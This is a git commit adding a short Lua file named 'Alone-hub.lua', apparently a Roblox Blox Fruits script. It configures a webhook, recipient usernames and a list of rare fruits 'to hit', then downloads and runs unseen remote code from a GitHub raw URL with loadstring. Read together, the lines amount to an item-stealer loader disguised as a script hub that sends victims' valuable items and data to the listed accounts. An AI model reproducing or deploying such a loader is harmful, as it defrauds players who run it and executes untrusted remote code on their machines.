1d505ceace5027549909b9649255016daec8f789
kn-h0b <nebisatyusifova@gmail.com>
2025-04-14 19:50:55 +0400

    Create Alone-hub.lua

---
+++ Alone-hub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=NWxqaFk1SEh5SG9USEZqZFkzT285ZzpwUFNDMEM2T0hTSUNKX19mOFk5VXJXTkctRVNJRmNxRWxiMy1xUWlnNVkyV1RRRjNSa051aGNyeDFIZXdiTGlrSkFXSHBBbXNtS1V0d1Axc0p3WVRKaGdQcUNYY0UtNVQyWTlrNV9EZ1JQZmIxX2d4NlJ4WERZcXFCRF9Fc0I5M2MycFZ1TWNxUnlYbU02RWJPSUVRbmVFb004bGl1NUVPZEU4bUt4Y1lLN0k" -- << Your Webhook
+Usernames = {"AWALS2011", "im_kiddd8","im_kidddfan"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
